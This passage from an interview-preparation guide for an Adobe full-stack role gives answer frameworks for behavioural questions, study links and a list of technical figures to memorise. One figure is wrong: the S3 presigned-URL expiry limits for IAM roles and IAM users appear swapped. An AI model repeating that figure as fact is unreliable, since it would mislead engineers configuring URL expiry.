**Key principles to communicate:**
- You disagreed with data, not opinion
- You respected the process (didn't go around them)
- You remained open — your approach might have been wrong
- You cared about the outcome, not being right

---

**STUDY REFERENCES:**
- **Google re:Work:** [STAR interview method](https://rework.withgoogle.com/)
- **ADR (Architecture Decision Records):** [https://adr.github.io/](https://adr.github.io/)
- **Martin Fowler:** [Micro-Frontends](https://martinfowler.com/articles/micro-frontends.html) — balanced tradeoffs
- **Related topics:** Technical Decision Records, RFC (Request for Comments) process, "disagree and commit" culture

---

### Q23 — Most Complex System You've Owned

**QUESTION:**
> Describe the most complex full-stack system you've owned end-to-end. What would you do differently?

---

**ANSWER FRAMEWORK:**

**Structure:**
1. What it was (brief, 2 sentences)
2. Technical complexity you owned (specific tech decisions)
3. Scale / impact (numbers)
4. What you'd do differently (shows growth mindset — this is what Adobe really wants)

**What Adobe looks for:**
- End-to-end ownership (not just "I built the frontend")
- Technical depth in decision-making
- Honesty about failures and lessons learned
- Proactive thinking about what "better" looks like

**Sample strong answer structure:**
"I owned [system] from initial architecture through production, supporting [X users/requests]. On the technical side, I designed [specific pattern — e.g., event-driven architecture, cache invalidation strategy, auth system]. The hardest decision was [tradeoff you made]. We hit [specific challenge] in production — [how you solved it]. 

What I'd do differently: I'd [specific improvement — e.g., invest earlier in observability/tracing, not use X ORM for performance-critical paths, design for eventual consistency from day one instead of retrofitting]. The lesson was [principle you learned]."

---

### Q24 — PM Wants 2 Weeks, You Need 6

**QUESTION:**
> A PM wants a feature shipped in 2 weeks. Your estimate is 6 weeks due to security requirements. How do you handle this?

---

**ANSWER:**

**What NOT to do:**
- Don't just say "no, it takes 6 weeks" (adversarial)
- Don't cave and ship insecure code in 2 weeks (negligent)
- Don't escalate immediately (you haven't tried to solve it)

**The senior engineering approach:**

**Step 1 — Understand what's driving the 2-week deadline:**
"Why 2 weeks specifically? Is there a customer commitment, a conference demo, a competitor release?" The answer changes your strategy.

**Step 2 — Break down the 6 weeks into phases:**
```
Phase 1 (2 weeks): Core feature with reduced scope — no sensitive data, mock auth
Phase 2 (2 weeks): Full security hardening — auth, encryption, audit logs
Phase 3 (2 weeks): Performance, edge cases, load testing
```

**Step 3 — Present options, not a binary:**
"Here's what we can ship in 2 weeks: [scoped version]. Here's what we can't safely include: [security feature]. Here are the risks if we do: [specific CVE or data exposure risk]. I'd recommend shipping Phase 1 to meet your deadline behind a feature flag, then Phase 2 before we open it to all users."

**Step 4 — Document the risk explicitly:**
If the PM still wants full feature in 2 weeks after seeing the risks, write it up: "I want to confirm in writing that we're accepting [specific risk] with a plan to remediate by [date]." This isn't CYA — it creates shared accountability.

**Key insight:** At Adobe, security is not optional. Adobe's products power government, healthcare, and financial customer data. A "ship now, fix security later" stance on an Adobe product could be a regulatory violation. You can say this: "Adobe's security standards require [X]. Shipping without it puts the company at compliance risk, not just technical debt."

---

**STUDY REFERENCES:**
- **OWASP:** [Security by Design Principles](https://owasp.org/www-project-developer-guide/draft/foundations/security_principles/)
- **Google Engineering Practices:** [How Google engineers make decisions](https://google.github.io/eng-practices/)
- **Lara Hogan's blog:** Engineering leadership communication
- **Related topics:** Feature flags for progressive rollout, risk acceptance framework, security champions program, shift-left security in CI/CD

---

## ═══════════════════════════════════════
## QUICK REFERENCE — 48-HOUR STUDY LIST
## ═══════════════════════════════════════

### Must-Read in Next 48 Hours (Priority Order):

1. **OWASP Top 10 (2021)** — https://owasp.org/Top10/ — A01 Broken Access Control, A02 Cryptographic Failures, A07 Authentication Failures
2. **OWASP JWT Cheat Sheet** — https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html
3. **Next.js Caching Docs** — https://nextjs.org/docs/app/getting-started/caching
4. **AWS Lambda Best Practices** — https://docs.aws.amazon.com/lambda/latest/dg/best-practices.html
5. **PostgreSQL EXPLAIN ANALYZE** — https://www.postgresql.org/docs/current/sql-explain.html
6. **Use the Index, Luke** — https://use-the-index-luke.com/ (Chapters 1-3)
7. **Node.js Event Loop** — https://nodejs.org/en/learn/asynchronous-work/event-loop-timers-and-nexttick
8. **Google Web Vitals** — https://web.dev/vitals/

### Key Numbers to Remember in the Interview:
- Lambda default timeout: 3s | Max: 15 min
- Lambda default concurrency: 1000 per region
- libuv default thread pool: 4 (`UV_THREADPOOL_SIZE`)
- PostgreSQL default max connections: 100 (configurable)
- Redis single-node throughput: ~100K ops/sec
- Kinesis shard capacity: 1MB/s write, 2MB/s read
- LCP target: < 2.5s | CLS target: < 0.1 | INP target: < 200ms
- JWT recommendation: access token 15min, refresh token 7 days
- S3 presigned URL max expiry: 7 days (IAM role), 12 hours (IAM user)
- CloudFront invalidation propagation: 30-60 seconds globally

---

*Document compiled by GitHub Copilot (Claude Sonnet 4.6) — June 15, 2026*
*Sources: OWASP CheatSheetSeries, Next.js Official Docs, AWS Documentation, Node.js Official Docs, MDN Web Docs, PostgreSQL Official Docs, Netflix Tech Blog, Meta Engineering Blog, Google Web.dev*
